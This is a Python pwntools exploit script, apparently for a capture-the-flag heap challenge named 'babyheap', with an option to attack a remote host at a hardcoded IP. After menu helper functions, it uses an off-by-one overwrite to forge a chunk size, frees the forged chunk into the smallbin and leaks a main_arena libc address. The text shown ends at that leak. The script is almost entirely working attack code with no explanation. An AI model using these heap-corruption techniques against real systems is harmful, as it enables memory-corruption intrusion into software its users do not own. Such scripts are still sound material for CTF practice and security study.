from pwn import *

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("202.120.7.204", 127 )
else:
    p = process("./babyheap")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *(0x555555554000 + 0xe88)
               b *(0x555555554000 + 0xfa9)
               """)
                # b *(0x555555554000 + 0xd54) 
               # b *(0x555555554000 + 0x119b)
               
def allocate(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.sendline(str(size))

def update(idx, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.sendline(content)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.sendline(str(idx))

def view(index):
    p.readuntil("Command: ")
    p.sendline("4")
    p.readuntil("Index: ")
    p.sendline(str(index))
    p.readuntil("Chunk[" + str(index) + "]: ")
    content = p.readline()
    return content

allocate(24) # idx 0
allocate(16)
allocate(72)
allocate(24)
allocate(16) # idx 4

update(0, 25, "A"*24 + "\x91") # last byte is new size for chunk idx 1. Smallbin sized

update(3, 24, 'B'*16 + p64(0x90)) # Set prev_size of smallbin chunk's nextchunk

delete(1) # Free forged smallbin chunk

allocate(40) # Allocate a new fastbin size, will be broken off the start of the freed smallbin chunk

arena_leak = u64(view(2)[16:24])
print "main_arena leak: ", hex(arena_leak)






